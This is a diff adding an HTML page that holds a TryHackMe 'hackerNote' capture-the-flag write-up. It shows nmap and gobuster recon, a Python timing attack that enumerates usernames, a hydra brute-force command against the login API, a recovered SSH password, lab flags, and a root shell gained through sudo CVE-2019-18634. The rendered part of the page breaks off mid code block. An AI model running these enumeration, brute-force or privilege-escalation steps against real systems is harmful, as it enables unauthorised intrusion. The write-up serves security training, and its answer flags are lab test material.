@@ -1,0 +1,477 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackerNote | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="HackerNote TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/hackernote/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/hackernote/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackerNote"><meta property="og:description" content="HackerNote TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/hackernote/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="HackerNote"><meta name=twitter:description content="HackerNote TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"HackerNote","item":"https://s4ch.github.io/writeups/tryhackme/hackernote/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackerNote","name":"HackerNote","description":"HackerNote TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit.\nhackerNote\n💢 We will cover the topics Network Enumeration Web Enumeration Username timing attack Brute Forcing (http-post-form) CVE-2019-18634 - Sudo 1.8.25p - ‘pwfeedback’ Buffer Overflow Task 1 Reconnaissance You’re presented with a machine. Your first step should be recon. Scan the machine with nmap, work out what’s running.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 kali@kali:~/CTFs/tryhackme/hackerNote$ sudo nmap -A -sS -sC -sV -O 10.10.24.100 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 21:41 CET Nmap scan report for 10.10.24.100 Host is up (0.040s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA) | 256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA) |_ 256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Home - hackerNote 8080/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-open-proxy: Proxy might be redirecting requests |_http-title: Home - hackerNote No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=32914%PV=Y%DS=2%DC=T%G=Y%TM=5FB041 OS:0B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 111/tcp) HOP RTT ADDRESS 1 51.24 ms 10.8.0.1 2 51.23 ms 10.10.24.100 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds Which ports are open? (in numerical order)\n22,80,8080\nWhat programming language is the backend written in?\nGo\nTask 2 Investigate Now that you know what’s running, you need to investigate. With webapps, the normal process is to click around. Create an account, use the web app as a user would and play close attention to details.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u 10.10.24.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.24.100 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/11/14 21:41:52 Starting gobuster =============================================================== /login (Status: 301) /notes (Status: 301) /http%3A%2F%2Fwww (Status: 301) Progress: 29969 / 220561 (13.59%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2020/11/14 21:43:41 Finished =============================================================== 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u http://10.10.24.100:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.24.100:8080 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/11/14 21:43:36 Starting gobuster =============================================================== /login (Status: 301) /notes (Status: 301) Progress: 16928 / 220561 (7.67%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2020/11/14 21:44:39 Finished =============================================================== http://10.10.24.100/login/\nhttp://10.10.24.100/notes/\nhttp://10.10.24.100:8080/login/\nhttp://10.10.24.100:8080/notes/\nview-source:http://10.10.24.100/login/login.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 async function login() { const username = document.querySelector(\"#username\").value; const password = document.querySelector(\"#password\").value; const button = document.querySelector(\"#loginButton\"); button.disabled = true; document.querySelector(\"#status\").textContent = \"Logging you in...\"; const response = await postData(\"/api/user/login\", { username: username, password: password, }); console.log(response); if (response.status !== undefined \u0026\u0026 response.status !== \"success\") { document.querySelector(\"#status\").textContent = \"\"; document.querySelector(\"#errorMessage\").textContent = response.status; button.disabled = false; return; } if (response.SessionToken !== undefined) { window.location = \"/notes\"; } } async function forgotPassword() { //Based on username, find return password hint var username = document.querySelector(\"#username\").value; const response = await getData(\"/api/user/passwordhint/\" + username); console.log(response); if (response.hint !== undefined \u0026\u0026 response.hint !== \"success\") { document.querySelector(\"#passwordHint\").textContent = \"Hint: \" + response.hint; return; } } function getCookie(name) { var v = document.cookie.match(\"(^|;) ?\" + name + \"=([^;]*)(;|$)\"); return v ? v[2] : null; } function onLoad() { const session = getCookie(\"SessionToken\"); console.log(session); if (session !== null \u0026\u0026 session !== \"\") { window.location = \"/notes\"; } } async function createUser() { const button = document.querySelector(\"#userCreateButton\"); const username = document.querySelector(\"#usernameCreate\").value; const password = document.querySelector(\"#passwordCreate\").value; const passwordHint = document.querySelector(\"#passwordHintCreate\").value; const user = { Username: username, Password: password, PasswordHint: passwordHint, }; document.querySelector(\"#statusCreation\").textContent = \"Creating your account\"; button.disabled = true; const response = await postData(\"/api/user/create\", user); console.log(response); if (response.status !== undefined) { if (response.status !== \"success\") { document.querySelector(\"#statusCreation\").textContent = \"\"; document.querySelector(\"#errorMessage\").textContent = response.status; return; } document.querySelector(\"#statusCreation\").textContent = \"\"; document.querySelector(\"#statusCreation\").textContent = \"Successfully created a user account\"; document.querySelector(\"#usernameCreate\").value = \"\"; document.querySelector(\"#passwordCreate\").value = \"\"; document.querySelector(\"#passwordHintCreate\").value = \"\"; return; } document.querySelector(\"#statusCreation\").textContent = \"\"; document.querySelector(\"#errorMessage\").textContent = \"Something went wrong...\"; } 1 2 3 4 5 login(); const response = await postData(\"/api/user/login\", { username: username, password: password, }); 1 2 forgotPassword(); const response = await getData(\"/api/user/passwordhint/\" + username); 1 2 createUser(); const response = await postData(\"/api/user/create\", user); Create your own user account\nNo answer needed\nLog in to your account\nNo answer needed\nTry and log in to an invalid user account\nNo answer needed\nTry and log in to your account, with an incorrect password.\nNo answer needed\nNotice the timing difference. This allows user enumeration\nNo answer needed\nTask 3 Exploit Use the timing attack\nNow that we know there’s a timing attack, we can write a python script to exploit it.\nThe first step is working out how login requests work. You can use Burpsuite for this, but I prefer to use Firefox dev tools as I don’t have to configure any proxies.\nHere we can see the login is a POST request to /api/user/login. This means we can make this request using CURL, python or another programming language of your choice.\nIn python, we can use this code and the Requests library to send this request as follows:\n1 2 creds = {\"username\":username,\"password\":\"invalidPassword!\"} response = r.post(URL,json=creds) The next stage is timing this. Using the “time” standard library, we can work out the time difference between when we send the request and when we get a response. I’ve moved the login request into it’s own function called doLogin.\n1 2 3 startTime = time.time() doLogin(user) endTime = time.time() The next step is now to repeat this for all usernames in the username list. This can be done with a series of for loops. The first will read usernames from a file into a list, and the second will test each of these usernames and see the time taken to respond. For my exploit, I decided that times within 10% of the largest time were likely to be valid usernames.\nWhy does the time taken change?\nThe backend is intentionally poorly written. The server will only try to verify the password of the user if it receives a correct username. The psuedocode to explain this better is below.\n1 2 3 4 5 6 7 8 9 def login(username, password): if username in users: ##If it's a valid username login_status = check_password(password) ##This takes a noticeable amount of time if login_status: return new_session_token() else: return \"Username or password incorrect\" else: return \"Username or password incorrect\" Pre-written exploits in Golang and Python are available here: https://github.com/NinjaJc01/hackerNoteExploits\nUse the Honeypot capture or Names/names.txt from https://github.com/danielmiessler/SecLists/tree/master/Usernames. The shorter the list is, the faster the exploit will complete. (Hint: one of those wordlists is shorter.)\nNOTE: The Golang exploit is not reliable but it is faster. If you get invalid usernames, try re-running it after a minute or switching to the python exploit.\nTry to write a script to perform a timing attack.\nHow many usernames from the list are valid?\n1 2 3 4 5 kali@kali:~/CTFs/tryhackme/hackerNote$ python3 exploitAPI.py Starting POST Requests Finished POST requests Time delta: 2.046557664871216 seconds (larger is better) james is likely to be valid 1\nWhat are/is the valid username(s)?\njames\nTask 4 Attack Passwords Next Step\nNow that we have a username, we need a password. Because the passwords are hashed with bcrypt and take a noticeable time to verify, bruteforcing with a large wordlist like rockyou is not feasible. Fortunately, this webapp has password hints!\nWith the username that we found in the last step, we can retrieve the password hint. From this password hint, we can create a wordlist and (more) efficiently bruteforce the user’s password.\nCreate your wordlist\nThe password hint is “my favourite colour and my favourite number”, so we can get a wordlist of colours and a wordlist of digits and combine them using Hashcat Util’s Combinator which will give us every combination of the two wordlists. Using this wordlist, we can then use Hydra to attack the login API route and find the password for the user. Download the attached wordlist files, look at them then combine them using hashcat-util’s combinator. Hashcat utils can be downloaded from: https://github.com/hashcat/hashcat-utils/releases Either add these to your PATH, or run them from the folder. We want to use the Combinator.bin binary, with colors.txt and numbers.txt as the input. The command for this is (assuming you’re in the directory with the binaries and have copiesd the txt files into that directory):\n./combinator.bin colors.txt numbers.txt \u003e wordlist.txt\nThis will then give you a wordlist to use for Hydra.\nAttack the API\nThe HTTP POST request that we captured earlier tells us enough about the API that we can use Hydra to attack it. The API is actually designed to either accept Form data, or JSON data. The frontend sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:\nRequest Body - JSON {\"username\":\"admin\",\"password\":\"admin\"} Request Path - /api/user/login Error message for incorrect logins - \"Invalid Username Or Password\" The command for this is (replace the parts with angle brackets, you will need to escape special characters):\nhydra -l -P 192.168.2.62 http-post-form ::\nForm the hydra command to attack the login API route\nNo answer needed\nHow many passwords were in your wordlist?\n1 2 kali@kali:~/CTFs/tryhackme/hackerNote$ wc wordlist.txt 180 180 1290 wordlist.txt 180\nWhat was the user’s password?\n1 2 3 4 5 6 7 8 9 10 kali@kali:~/CTFs/tryhackme/hackerNote$ hydra -l james -P wordlist.txt 10.10.24.100 http-post-form \"/api/user/login:username=^USER^\u0026password=^PASS^:Invalid Username Or Password\" Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-14 22:10:51 [DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task [DATA] attacking http-post-form://10.10.24.100:80/api/user/login:username=^USER^\u0026password=^PASS^:Invalid Username Or Password [STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active [80][http-post-form] host: 10.10.24.100 login: james password: blue7 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-14 22:12:03 blue7\nLogin as the user to the platform\nNo answer needed\nWhat’s the user’s SSH password?\n1 2 3 My SSH details So that I don't forget, my SSH password is dak4ddb37b dak4ddb37b\nLog in as the user to SSH with the credentials you have.\nNo answer needed\nWhat’s the user flag?\n1 2 james@hackernote:~$ cat user.txt thm{56911bd7ba1371a3221478aa5c094d68} thm{56911bd7ba1371a3221478aa5c094d68}\nTask 5 Escalate Enumeration of privileges\nNow that you have an SSH session, you can grab the user flag. But that shouldn’t be enough for you, you need root. A good first step for privilege escalation is seeing if you can run sudo. You have the password for the current user, so you can run the command:\nsudo -l\nThis command tells you what commands you can run as the superuser with sudo. Unfortunately, the current user cannot run any commands as root. You may have noticed, however, that when you enter your password you see asterisks. This is not default behaviour. There was a recent CVE released that affects this configuration. The setting is called pwdfeedback.\n1 2 james@hackernote:~$ sudo -l [sudo] password for james: ********** What is the CVE number for the exploit?\nCVE-2019-18634\nFind the exploit from https://github.com/saleemrashid/ and download the files.\nNo answer needed\nCompile the exploit from Kali linux.\nNo answer needed\nSCP the exploit binary to the box.\nNo answer needed\nRun the exploit, get root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 james@hackernote:~$ ls -la total 928 drwxr-xr-x 4 james james 4096 Nov 14 21:21 . drwxr-xr-x 4 root root 4096 Feb 8 2020 .. lrwxrwxrwx 1 james james 9 Feb 10 2020 .bash_history -\u003e /dev/null -rw-r--r-- 1 james james 220 Feb 8 2020 .bash_logout -rw-r--r-- 1 james james 3771 Feb 8 2020 .bashrc drwx------ 2 james james 4096 Feb 8 2020 .cache -rwxr-xr-x 1 james james 916872 Nov 14 21:21 exploit drwx------ 3 james james 4096 Feb 8 2020 .gnupg -rw-r--r-- 1 james james 807 Feb 8 2020 .profile -rw------- 1 james james 38 Feb 8 2020 user.txt james@hackernote:~$ ./exploit [sudo] password for james: Sorry, try again. # id uid=0(root) gid=0(root) groups=0(root),1001(james) # cat /root/root.txt thm{af55ada6c2445446eb0606b5a2d3a4d2} No answer needed\nWhat is the root flag?\nthm{af55ada6c2445446eb0606b5a2d3a4d2}\nTask 6 Comments on realism and Further Reading Web app\nThis room was designed to be more realistic and less CTF focused. The logic behind the timing attack is mentioned in OWASP’s authentication section, and a fairly similar timing attack existed on OpenSSH, allowing username enumeration. I’ve included links to this in the Further Reading section\nPassword hints in webapps are normally considered bad practice, but large companies still often include them. Adobe suffered a large databreach affecting users of Creative Cloud and decryption of the passwords was made much easier due to the password hints also included in the breach.\nPrivilege Escalation\nThe privilege escalation for this box is a real world CVE vulnerability, and affected the default configurations of sudo on macOS, Linux Mint and ElementaryOS.\nFurther reading\nTiming attacks on logins\nhttps://seclists.org/fulldisclosure/2016/Jul/51 https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/ https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002) Adobe Password Breach\nhttps://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/ Sudo CVE\nhttps://dylankatz.com/Analysis-of-CVE-2019-18634/ https://nvd.nist.gov/vuln/detail/CVE-2019-18634 https://tryhackme.com/room/sudovulnsbof Read, explore, learn.\n","wordCount":"2373","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/hackernote/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">HackerNote</h1><div class=post-description>HackerNote TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2373 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-reconnaissance>Task 1 Reconnaissance</a></li><li><a href=#task-2-investigate>Task 2 Investigate</a></li><li><a href=#task-3-exploit>Task 3 Exploit</a></li><li><a href=#task-4-attack-passwords>Task 4 Attack Passwords</a></li><li><a href=#task-5-escalate>Task 5 Escalate</a></li><li><a href=#task-6-comments-on-realism-and-further-reading>Task 6 Comments on realism and Further Reading</a></li></ul></nav></div></details></div><div class=post-content><p>A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit.</p><p><a href=https://tryhackme.com/room/hackernote>hackerNote</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>Web Enumeration</li><li>Username timing attack</li><li>Brute Forcing (http-post-form)</li><li>CVE-2019-18634 - Sudo 1.8.25p - &lsquo;pwfeedback&rsquo; Buffer Overflow</li></ul><hr><h2 id=task-1-reconnaissance>Task 1 Reconnaissance<a hidden class=anchor aria-hidden=true href=#task-1-reconnaissance>#</a></h2><p>You&rsquo;re presented with a machine. Your first step should be recon. Scan the machine with nmap, work out what&rsquo;s running.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/hackerNote$ sudo nmap -A -sS -sC -sV -O 10.10.24.100
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 21:41 CET
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.24.100
+</span></span><span class=line><span class=cl>Host is up (0.040s latency).
+</span></span><span class=line><span class=cl>Not shown: 997 closed ports
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey:
+</span></span><span class=line><span class=cl>|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
+</span></span><span class=line><span class=cl>|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
+</span></span><span class=line><span class=cl>|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
+</span></span><span class=line><span class=cl>80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+</span></span><span class=line><span class=cl>|_http-title: Home - hackerNote
+</span></span><span class=line><span class=cl>8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+</span></span><span class=line><span class=cl>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span class=line><span class=cl>|_http-title: Home - hackerNote
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=32914%PV=Y%DS=2%DC=T%G=Y%TM=5FB041
+</span></span><span class=line><span class=cl>OS:0B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP
+</span></span><span class=line><span class=cl>OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
+</span></span><span class=line><span class=cl>OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
+</span></span><span class=line><span class=cl>OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+</span></span><span class=line><span class=cl>OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+</span></span><span class=line><span class=cl>OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+</span></span><span class=line><span class=cl>OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+</span></span><span class=line><span class=cl>OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+</span></span><span class=line><span class=cl>OS:D=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 111/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   51.24 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   51.23 ms 10.10.24.100
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds
+</span></span></code></pre></td></tr></table></div></div><p>Which ports are open? (in numerical order)</p><p><code>22,80,8080</code></p><p>What programming language is the backend written in?</p><p><code>Go</code></p><h2 id=task-2-investigate>Task 2 Investigate<a hidden class=anchor aria-hidden=true href=#task-2-investigate>#</a></h2><p>Now that you know what&rsquo;s running, you need to investigate. With webapps, the normal process is to click around. Create an account, use the web app as a user would and play close attention to details.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
